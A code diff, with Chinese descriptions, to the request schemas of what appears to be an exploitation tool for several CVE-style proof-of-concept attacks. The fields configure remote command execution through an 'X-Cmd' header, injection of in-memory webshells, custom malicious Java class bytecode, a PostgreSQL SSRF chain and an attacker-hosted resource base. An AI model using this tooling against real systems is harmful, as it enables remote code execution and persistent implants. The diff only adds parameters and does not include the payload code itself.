@@ -205,11 +205,28 @@ class Poc1247Request(BaseModel):
     json_key_as_array: bool = Field(
         False, description="json_key 用 JSONArray 作 key"
     )
-    echo: bool = Field(False, description="BCEL/H2/MyBatis 自动回显")
-    engine: str = Field("auto", description="回显引擎")
-    cmd: str = Field("id", description="回显默认命令")
-    cmd_header: str = Field("X-Cmd", description="命令请求头")
-    memshell: bool = Field(False, description="注入内存马（与 echo 互斥）")
+    preset: str = Field(
+        "auto",
+        description=(
+            "预设字节码：auto / custom / touch / exec / echo / memshell（off→custom）；"
+            "未提供字节码时 auto 默认生成 exec 类"
+        ),
+    )
+    proof_path: Optional[str] = Field(
+        None, description="preset=touch/exec/auto 证明文件路径"
+    )
+    proof_content: Optional[str] = Field(
+        None, description="preset=touch/exec/auto 写入内容前缀"
+    )
+    echo: bool = Field(
+        False, description="兼容旧字段：true 等价于 preset=echo"
+    )
+    engine: str = Field("auto", description="回显引擎（preset=echo）")
+    cmd: str = Field("id", description="回显 / preset=exec 命令")
+    cmd_header: str = Field("X-Cmd", description="命令请求头（preset=echo）")
+    memshell: bool = Field(
+        False, description="兼容旧字段：true 等价于 preset=memshell"
+    )
     ms_api: str = Field(
         "jar",
         description="jar=内置 memshell-gen.jar；或 http(s)://... MemShellParty boot",
@@ -259,12 +276,25 @@ class Poc1268Request(BaseModel):
     currency_field: str = Field(
         "currency", description="Currency 字段：currency 或 currencyCode"
     )
-    echo: bool = Field(False, description="postgresql_ssrf 回显")
-    engine: str = Field("auto", description="回显引擎")
-    cmd: str = Field("id", description="回显默认命令")
-    cmd_header: str = Field("X-Cmd", description="命令请求头")
+    preset: str = Field(
+        "file",
+        description=(
+            "postgresql_ssrf 预设：file / custom / exec / echo / memshell"
+        ),
+    )
+    class_b64: Optional[str] = Field(
+        None, description="preset=custom 时的恶意 .class Base64"
+    )
+    echo: bool = Field(
+        False, description="兼容旧字段：true 等价于 preset=echo"
+    )
+    engine: str = Field("auto", description="回显引擎（preset=echo）")
+    cmd: str = Field("id", description="回显 / preset=exec 命令")
+    cmd_header: str = Field("X-Cmd", description="命令请求头（preset=echo）")
     attack_base: Optional[str] = Field(None, description="回显/内存马资源托管基址")
-    memshell: bool = Field(False, description="注入内存马（与 echo 互斥）")
+    memshell: bool = Field(
+        False, description="兼容旧字段：true 等价于 preset=memshell"
+    )
     ms_api: str = Field(
         "jar",
         description="jar=内置 memshell-gen.jar；或 http(s)://... MemShellParty boot",
@@ -329,12 +359,25 @@ class Poc1280Request(BaseModel):
     currency_field: str = Field(
         "currency", description="Currency 字段：currency 或 currencyCode"
     )
-    echo: bool = Field(False, description="postgresql/jython/groovy 回显")
-    engine: str = Field("auto", description="回显引擎")
-    cmd: str = Field("id", description="回显默认命令")
-    cmd_header: str = Field("X-Cmd", description="命令请求头")
+    preset: str = Field(
+        "file",
+        description=(
+            "postgresql/jython/groovy 预设：file / custom / exec / echo / memshell"
+        ),
+    )
+    class_b64: Optional[str] = Field(
+        None, description="preset=custom 时的恶意 .class Base64"
+    )
+    echo: bool = Field(
+        False, description="兼容旧字段：true 等价于 preset=echo"
+    )
+    engine: str = Field("auto", description="回显引擎（preset=echo）")
+    cmd: str = Field("id", description="回显 / preset=exec 命令")
+    cmd_header: str = Field("X-Cmd", description="命令请求头（preset=echo）")
     attack_base: Optional[str] = Field(None, description="回显/内存马资源托管基址")
-    memshell: bool = Field(False, description="注入内存马（与 echo 互斥）")
+    memshell: bool = Field(
+        False, description="兼容旧字段：true 等价于 preset=memshell"
+    )
     ms_api: str = Field(
         "jar",
         description="jar=内置 memshell-gen.jar；或 http(s)://... MemShellParty boot",
